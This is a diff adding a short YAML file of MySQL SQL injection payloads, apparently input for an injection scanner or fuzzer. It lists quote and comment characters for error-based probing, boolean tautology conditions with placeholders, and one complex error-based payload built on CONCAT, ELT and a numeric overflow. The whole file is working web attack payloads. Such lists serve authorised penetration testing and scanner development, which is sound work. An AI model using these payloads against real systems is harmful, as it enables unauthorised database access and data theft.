@@ -1,0 +1,22 @@
+MySQL:
+  payload_type:
+    simple_error_based:
+                        - "'"
+                        - '--'
+                        - ';'
+                        - '"'
+                        - '/*'
+                        - "'/*"
+                        - "'--"
+                        - '"--'
+                        - "';"
+                        - '";'
+                        - '`'
+    func_error_based:
+                        - "AND '[fix_num]'='[fix_num]'"
+                        - "AND '[fix_num]'='[fix_num]' OR '[rand_num]'='[rand_num]'"
+                        - "AND [fix_num]=[fix_num] OR AND [fix_num]'='[fix_num]' AND '[bool]'='[bool]'"
+                        - "OR [bool]=[bool] AND [rand_str]=[rand_str] OR [rand_num]=[rand_num]"
+    complex_error_based:
+                        - "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[fix_num]'='[fix_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"
+                        - ""
